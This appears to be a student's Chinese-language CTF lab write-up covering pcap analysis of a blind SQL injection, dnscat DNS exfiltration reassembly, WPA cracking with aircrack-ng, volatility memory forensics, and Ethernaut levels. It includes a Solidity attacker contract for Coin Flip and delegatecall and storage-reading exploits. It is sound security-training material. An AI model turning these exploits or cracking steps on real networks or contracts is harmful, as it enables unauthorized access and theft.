# Lab3-Misc Report

**<font size=5>Contents</font>**

[TOC]

<div style="page-break-after:always;"></div>

## Challenge 1：SQR Inject Analysis

将下载的 sqltest.pcapng 用 wireshark 打开，查看 HTTP 请求：

![image-20240714190558696](/Users/bruce/Library/Application Support/typora-user-images/image-20240714190558696.png)

由内部的 select... 可以看出这是一个 sql 注入语句，我们将所有的类似的语句拿出来看看：

![image-20240714191333172](/Users/bruce/Library/Application Support/typora-user-images/image-20240714191333172.png)

往下翻会发现跟 flag 字符 ASCII 值有关的语句：

![image-20240714191731700](/Users/bruce/Library/Application Support/typora-user-images/image-20240714191731700.png)

由上图我们从第 1 行到第 10 行可以看出攻击者最后把 flag 的 ASCII 码定位在了 102，即 flag 第一位为 f，我们执行命令行 `tshark -r sqltest.pcapng -Y "http.request" -T fields -e http.request.full_uri > data.txt` 导出这些数据为 data.txt，并编写 python 程序如下：

```python
file = open("data.txt","r").readlines()

ans = []
for i in range(627, 972):
    index = file[i].split(",")[3][1:]
    value = file[i].split(">")[1]
    ans.append([index, value])

for i in range(1, len(ans)):
    if ans[i][0] != ans[i-1][0]:
        print(chr(int(ans[i-1][1])), end = "")
        
print(chr(int(ans[-1][1])))
```

运行即可得到 flag：

![image-20240714210228759](/Users/bruce/Library/Application Support/typora-user-images/image-20240714210228759.png)

## Challenge 2：dnscap

通过 wireshark 打开 dnscap.pcap，发现全是 DNS 协议，打开看其发起的查询：

![image-20240715124237630](/Users/bruce/Library/Application Support/typora-user-images/image-20240715124237630.png)

均为 xxx.skullsecloabs.org 格式，我们使用命令行 `tshark -r dnscap.pcap -T fields -e dns.qry.name > data.txt`  并编写 python 程序如下：

```python
import binascii
import re

file = open("data.txt", "r").readlines()
for line in file:
    text = re.findall(r"([\w\.]+)\.skullseclabs\.org", line)
    text = text[0].replace('.', '')
    ans = binascii.unhexlify(text)
    print(ans)
```

得到一些信息：

![image-20240715205247614](/Users/bruce/Library/Application Support/typora-user-images/image-20240715205247614.png)

![image-20240715210554440](/Users/bruce/Library/Application Support/typora-user-images/image-20240715210554440.png)

这不仅仅有重复数据，还有 PNG 和它的标准结尾 IEND，我们可以合理猜测去重以及一些不必要的数据后可以得到一个 png 文件。

哪些是不必要的数据呢？我们查看 dnscat 协议文档：

![image-20240715215331086](/Users/bruce/Library/Application Support/typora-user-images/image-20240715215331086.png)

这其中前九个 Byte 的数据均为 dns 发送端接收端等相关数据，是我们所不需要的，我们需要的是这里的 Data。

完善 python 代码：

```python
import binascii
import re

prev = ''
output = b''
flag = False
file = open("data.txt", "r").readlines()

for line in file:
    text = re.findall(r"([\w\.]+)\.skullseclabs\.org", line)
    text = text[0].replace('.', '')
    ans = binascii.unhexlify(text)[9:]

    if ans not in output:
        if(b'PNG' in ans):
            output += ans[8:]
            flag = True
        elif flag:
            output += ans
            if (b'IEND' in ans):
                break

open("output.png", "wb").write(output)
```

奇怪的是这个代码运行过后打不开 png，用 Hex Fiend 打开发现有两个 PNG，去掉前面这个就能打开了，不太清楚原因，还望指正。

![image-20240716082224048](/Users/bruce/Library/Application Support/typora-user-images/image-20240716082224048.png)

去掉之后得到 png，flag 就在里面：

![output](/Users/bruce/output.png)

## Challenge 3：crac_zju_wlan

解压 zip 文件得到 img 文件，挂载到 linux 上之后可以发现 crack_zju-01.cap 和一个隐藏的 .password.txt.swp 文件。

经过查询，swp 文件是一个临时交换文件，用来备份缓冲区的内容，正常情况下保存好 password.txt 并退出是不会产生 swp 文件的，所以我们需要通过 swp 文件来恢复 password.txt。

经过查询，用命令行 `vi -r password.txt ` 即可恢复。

最后我们使用命令行 `aircrack-ng -w password.txt -b 12:2A:E2:13:5C:84 crack_zju-01.cap` ，得到 Wi-Fi 密码：

![image-20240716224952375](/Users/bruce/Library/Application Support/typora-user-images/image-20240716224952375.png)

所以最终 flag 为：AAA{0YcWPeLMBp}

## Challenge A：内存取证

解压 zip 文件，有错误但是也解压出了一个 mem.raw 文件，我们尝试用命令行 `strings mem.raw|grep flag` 来查看一下有没有关于 flag 的信息。

![image-20240717130900274](/Users/bruce/Library/Application Support/typora-user-images/image-20240717130900274.png)

能发现在这个 mem 文件中有一个叫 flag.zip 的压缩包，用 foremost 语句把它分离出来：

![image-20240717131240908](/Users/bruce/Library/Application Support/typora-user-images/image-20240717131240908.png)

查询分离出来的 zip：

![image-20240717131319166](/Users/bruce/Library/Application Support/typora-user-images/image-20240717131319166.png)

尝试解压，发现 01377758.zip 这个文件中有 flag.txt，但是需要密码：

![image-20240717131424494](/Users/bruce/Library/Application Support/typora-user-images/image-20240717131424494.png)

我们 volatility 一把梭，先使用命令行 `python2 volatility/vol.py -f mem.raw imageinfo` 查看操作系统：

![image-20240717203641547](/Users/bruce/Library/Application Support/typora-user-images/image-20240717203641547.png)

可以发现是 win7x64 系统，再利用这个用命令行 `python2 volatility/vol.py -f mem.raw --profile Win7SP1x64 cmdscan`查看 cmd 历史：

![image-20240717204043152](/Users/bruce/Library/Application Support/typora-user-images/image-20240717204043152.png)

看到有这么一句话：“Stucked?You can ask WallPaper god for help.”

所以用命令行 `strings mem.raw|grep Wallpaper` 接着搜文件，看到：

![image-20240717204439822](/Users/bruce/Library/Application Support/typora-user-images/image-20240717204439822.png)

![image-20240717204510437](/Users/bruce/Library/Application Support/typora-user-images/image-20240717204510437.png)

有两张图片，img0.jpeg 和 img0.jpg，我们通过命令行 `python2 volatility/vol.py -f mem.raw --profile=Win7SP1x64 filescan | grep img0 `找它们的十六进制位置：

![image-20240717205135760](/Users/bruce/Library/Application Support/typora-user-images/image-20240717205135760.png)

利用这两个十六进制位置用命令行 `python2 volatility/vol.py -f mem.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000007eee11c0/0x000000007fc48f20 -D .` 把这两个文件 dump 出来，出现两个文件 file.None.0xfffffa8001c98010.dat 和 file.None.0xfffffa80031c2c10.dat ，用命令行 `eog file.None.0xfffffa8001c98010.dat` 查看得到：

![image-20240717210822108](/Users/bruce/Library/Application Support/typora-user-images/image-20240717210822108.png)

这里有说关于 zip 密码的内容，需要我们找到 flag.zip 不包含 Desktop 的路径，用命令行 `python2 volatility/vol.py -f mem.raw --profile=Win7SP1x64 mftparser > mftparser.txt` ，查看得到：

![image-20240717211748588](/Users/bruce/Library/Application Support/typora-user-images/image-20240717211748588.png)

可以看出最终的路径应该是：C:\Program Files (x86)\Windows NT\Accessories\flag.zip，那么代入函数，得到 flag：

![image-20240717212027456](/Users/bruce/Library/Application Support/typora-user-images/image-20240717212027456.png)

用这个密码成功解压 flag.zip，得到 flag.txt，查看内容：

![image-20240717212431056](/Users/bruce/Library/Application Support/typora-user-images/image-20240717212431056.png)

所以最终 flag 为 n1ctf{0ca175b9c0f7582931d89e2c89231599}

## Challenge B：Ethernaut

### Coin Flip

点击 Get new instance，可以看到合约地址：

![image-20240721131040204](/Users/bruce/Library/Application Support/typora-user-images/image-20240721131040204.png)

根据题目描述，我们需要连续 10 次猜对硬币的正反面。所给代码如下：

```solidity
pragma solidity ^0.8.0;

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}
```

根据代码，我们可以看到 blockValue 是由前一个区块而决定的，但是我们无法知道前一个区块，所以我们可以在自己的内部创造一个合约，将结果送给合约即可，编写 solidity 代码如下：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";

interface  CoinFlipInterface {
    function flip(bool) external returns(bool);
}

contract CoinFlipAttacker{
    
    using SafeMath for uint256;
    address private addr;
    CoinFlipInterface interface;

    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _addr) public {
        addr = _addr;
        interface = CoinFlipInterface(_addr);
    }

    function getFlip() private returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        return side;
    }
                        
    function attack() public {
        bool side = getFlip();
        interface.flip(side);
    }

}
```

设置相关参数（合约地址等）：

<img src="/Users/bruce/Library/Application Support/typora-user-images/image-20240721143545839.png" alt="image-20240721143545839" style="zoom:50%;" />

执行一次 attack 函数，我们可以看到在合约中 consecutiveWins 有增加：

<img src="/Users/bruce/Library/Application Support/typora-user-images/image-20240721143636354.png" alt="image-20240721143636354" style="zoom:50%;" />

<img src="/Users/bruce/Library/Application Support/typora-user-images/image-20240721143647014.png" alt="image-20240721143647014" style="zoom:50%;" />

所以最后我们多次执行，直到其为 10，提交实例即可通过：

<img src="/Users/bruce/Library/Application Support/typora-user-images/image-20240721143726185.png" alt="image-20240721143726185" style="zoom:50%;" />

### Delegation

根据题意，这个关卡要求获得合约 Delegation 的所有权，我们先查看 Delegation 的 owner：

![image-20240721145916285](/Users/bruce/Library/Application Support/typora-user-images/image-20240721145916285.png)

因此我们需要将 contract.owner()更改成 player，所给代码如下：

```solidity
pragma solidity ^0.8.0;

contract Delegate {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;
    }
}

contract Delegation {
    address public owner;
    Delegate delegate;

    constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    fallback() external {
        (bool result,) = address(delegate).delegatecall(msg.data);
        if (result) {
            this;
        }
    }
}
```

这里我们可以看到，Delegation 合约的 owner 在建立初期就已经被确立了，我们很难直接在 Delegation 中直接更改 owner 的值，但是有第二个合约 Delegate，它其中的 owner 可以通过函数 pwn() 进行更改，同时两个合约通过Delegation 的 fallback 函数，基于 delegatecall 的方法展开调用。

通过查询相关资料，我们可以得知 delegatecall 调用后内置变量 msg 的值 A 不会修改为调用者，但执行环境为调用者的运行环境 B，也就意味着我们虽然执行的是 Delegate 合约中的函数，但是我们是在 Delegation 的环境下执行，这样也就可以更改 Delegation 的 owner 。交互如下：

![image-20240721150040107](/Users/bruce/Library/Application Support/typora-user-images/image-20240721150040107.png)

成功更改 owner，提交实例即可通过：

<img src="/Users/bruce/Library/Application Support/typora-user-images/image-20240721150142117.png" alt="image-20240721150142117" style="zoom:50%;" />

### Vault

根据题意，这个关卡需要我们将合约中的 locked 变量改为 false，代码如下：

```solidity
pragma solidity ^0.8.0;

contract Vault {
    bool public locked;
    bytes32 private password;

    constructor(bytes32 _password) {
        locked = true;
        password = _password;
    }

    function unlock(bytes32 _password) public {
        if (password == _password) {
            locked = false;
        }
    }
}
```

可以看到，只要我们输入 password 正确，即可将 locked 改为 false，但是在这里 password 被设置成了私有：

![image-20240721151002813](/Users/bruce/Library/Application Support/typora-user-images/image-20240721151002813.png)

我们可以通过 `web3.eth.getStorageAt` 来查看变量存储的地址，这样就便于我们找到 password 变量，传进 unlock 函数即可，交互界面如下：

![image-20240721151507006](/Users/bruce/Library/Application Support/typora-user-images/image-20240721151507006.png)

提交实例即可通过：

![image-20240721151556843](/Users/bruce/Library/Application Support/typora-user-images/image-20240721151556843.png)